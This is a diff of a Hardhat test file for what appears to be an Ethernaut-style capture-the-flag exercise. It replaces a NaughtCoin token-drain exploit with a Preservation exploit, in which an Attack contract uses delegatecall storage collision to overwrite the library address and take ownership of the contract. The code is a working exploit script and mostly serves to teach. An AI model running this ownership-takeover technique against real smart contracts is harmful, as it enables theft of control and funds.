@@ -1,120 +1,79 @@
 import { expect } from "chai";
-import { Attack, NaughtCoin } from "../typechain-types";
+import { Attack, Preservation } from "../typechain-types";
 import { ethers } from "hardhat";
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
-import { BigNumber } from "ethers";
+import { getContractFactory } from "@nomiclabs/hardhat-ethers/types";
 
-describe("Gatekeeper exploit using contract attack", function () {
+describe("Preservation exploit using delegate call fun", function () {
   let attackerContract: Attack,
-    naughtCoinContractAddress: string,
-    naughtCoinContract: NaughtCoin,
+    contractAddress: string,
+    preservationContract: Preservation,
     attacker: SignerWithAddress,
-    totalSupply: BigNumber,
-    balanceOfAttacker: BigNumber,
-    balanceOfAttackerContract: BigNumber;
+    owner: string;
+
   //Exploit takes place in deployment
   before("Setup for attack locally", async function () {
+    // Setup deployment for library contracts
     [attacker] = await ethers.getSigners();
 
-    naughtCoinContractAddress = "0xfc30405Df84BdAf5F4d97f5B410052c806DE5342";
+    contractAddress = "0x512a585df585cfab5b49e8be38733866697ba5f0";
 
-    naughtCoinContract = await ethers.getContractAt(
-      "NaughtCoin",
-      naughtCoinContractAddress
+    preservationContract = await ethers.getContractAt(
+      "Preservation",
+      contractAddress
     );
 
     const attackerContractFactory = await ethers.getContractFactory("Attack");
 
     attackerContract = await attackerContractFactory.deploy(
-      naughtCoinContract.address
+      preservationContract.address
     );
 
     await attackerContract.deployed();
   });
 
   it("perform exploit", async function () {
-    // Check total supply, should equal initial supply because of minting
-
-    totalSupply = await naughtCoinContract.totalSupply();
-
-    console.log("The total supply of naughtcoin is: ", totalSupply);
-
-    // check the initial balance of the player address - should = initial supply
-    let initialBalanceOfAttacker = await naughtCoinContract.balanceOf(
-      attacker.address
-    );
-
+    // NOTE: The delegate call is context preserving. The contract making the call preserves state
     console.log(
-      "The initial balance of the naughtcoin player/attacker address is: ",
-      initialBalanceOfAttacker
+      "The owner before the attack is",
+      await preservationContract.owner()
     );
 
-    // check the initial balance of the attack contract address - should = 0
+    let oldLibraryAddress = await preservationContract.timeZone1Library();
 
-    let initialBalanceOfAttackerContract = await naughtCoinContract.balanceOf(
-      attackerContract.address
-    );
+    // Step 1 Stored time of the calling contract is at slot 1. Let's have the attacker contract call setFirstTime and pass in the address casted as uint. timeZone1library slot will now be my attacker contract
+    let txSetLibraryToAttackAddress =
+      await attackerContract.setLibraryToAttackAddress({
+        gasLimit: 21000000,
+      });
 
+    await txSetLibraryToAttackAddress.wait();
+
+    // Check and see that the address of the library has changed like we intended  address of
+
+    let newLibraryAddress = await preservationContract.timeZone1Library();
+    console.log("The first timzone library address is ", oldLibraryAddress);
     console.log(
-      "The initial naughtcoin balance of the attacker contract  is: ",
-      initialBalanceOfAttackerContract
+      "The new library address is (attacker contract address)",
+      newLibraryAddress
     );
 
-    // check allowance of deployed contract
+    // Step 2 The attacker contract will have 3 storage slots, address buffer, address buffer, uint owner and a function called setTime. This setFirstTime will be called again and it will set the owner as address(this)
 
-    let initialAllowance = await naughtCoinContract.allowance(
-      attacker.address,
-      attackerContract.address
-    );
+    let txSetOwnerOfPreservationContract =
+      await attackerContract.SetOwnerOfPreservationContract({
+        gasLimit: 21000000,
+      });
 
-    console.log(
-      "The inital allowance of the attack contract is",
-      initialAllowance
-    );
+    await txSetOwnerOfPreservationContract.wait();
 
-    // grant the attack contract the approval to spend all tokens
+    owner = await preservationContract.owner();
 
-    let txGrantApproval = await naughtCoinContract.approve(
-      attackerContract.address,
-      totalSupply
-    );
-
-    await txGrantApproval.wait();
-    // check allowance after approval
-    let newAllowance = await naughtCoinContract.allowance(
-      attacker.address,
-      attackerContract.address
-    );
-
-    console.log("The new allowance of the attack contract is", newAllowance);
-
-    // initiate the transferFrom call so that the attack contract can transfer balance on users behalf
-
-    let txWithdrawWithContract =
-      await attackerContract.contractWithdrawTokens();
-
-    await txWithdrawWithContract.wait();
-
-    balanceOfAttacker = await naughtCoinContract.balanceOf(attacker.address);
-
-    console.log(
-      "The final balance of the attacker/player address is",
-      balanceOfAttacker
-    );
-
-    balanceOfAttackerContract = await naughtCoinContract.balanceOf(
-      attackerContract.address
-    );
-
-    console.log(
-      "The final balance of the attacker contract address is",
-      balanceOfAttackerContract
-    );
-  });
+    console.log("The owner after the attack is ", owner);
+  }).timeout(30000000);
 
   after("confirm exploit", async function () {
-    // check that the reentrance contract == 0
-    expect(balanceOfAttacker).to.be.eq(0);
-    expect(balanceOfAttackerContract).to.be.gte(totalSupply);
+    // check that the new owner of the preservation contract is indeed my address
+    expect(owner).to.be.eq(attacker.address);
   });
 });
